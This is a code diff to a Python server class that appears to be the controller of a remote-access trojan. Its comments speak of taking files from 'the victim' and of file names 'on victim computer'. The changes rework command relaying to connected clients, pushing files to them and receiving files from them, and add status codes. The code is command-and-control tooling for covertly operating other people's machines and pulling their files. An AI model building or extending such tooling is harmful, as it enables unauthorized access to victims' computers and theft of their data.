@@ -9,6 +9,9 @@ CANT_OPEN_FILE = "200@"  # Cant open the file successfully
 COMMAND_NOT_FOUND = "300@"  # Cant open find the command
 CANT_OPEN_HANDLE = "400@"  # Cant open handle
 HANDLE_WAS_OPENED = "500@"  # Handle was opened successfully
+FILE_OPENED = "600@"  # The file was opened
+FILE_EXIST = "700@"  # The file is existing
+FILE_NOT_EXIST = "800@"  # The file is not exist
 
 
 class Server:
@@ -46,8 +49,10 @@ class Server:
         self.get_command_from_server()
 
     def receive_file_from_client(self, path_to_save, sock):
-
-        # Take from the victim file
+        if sock.recv(4).decode() != FILE_OPENED:
+            self.web_server_socket.send("Cant open this file".encode())
+            return
+            # Take from the victim file
         if path_to_save == "":
             self.web_server_socket.send("Where do you want save the file?".encode())
             data = self.web_server_socket.recv(1024).decode()
@@ -141,6 +146,17 @@ class Server:
         print("test")
         print(command)
         data = None
+
+        if command.startswith('send file'):
+            path = command[10:-1] + command[-1]
+            # Checking if the file exist
+            if not os.path.isfile(path):
+                self.web_server_socket.send("This file is not exist!".encode())
+                return
+            sock.send(command.encode('utf-8'))
+            self.send_file_to_client(path, sock)
+            return
+
         sock.send(command.encode('utf-8'))
 
         # recv file (file name on victim computer)
@@ -167,15 +183,6 @@ class Server:
                 print(e)
                 print(data)
 
-
-        elif command.startswith('send file'):
-            command = command[10:-1] + command[-1]
-            # Checking if the file exist
-            if not os.path.isfile(command):
-                self.web_server_socket.send("This file is not exist!".encode())
-                return
-            self.send_file_to_client(command, sock)
-
         elif command == 'exit':
             return
 
@@ -196,6 +203,10 @@ class Server:
         else:
             data = sock.recv(1024).decode('utf-8')
             print(data)
+
+            if data == COMMAND_NOT_FOUND:
+                self.web_server_socket.send("The command was not found".encode())
+                return
             self.web_server_socket.send(data.encode())
             return
 
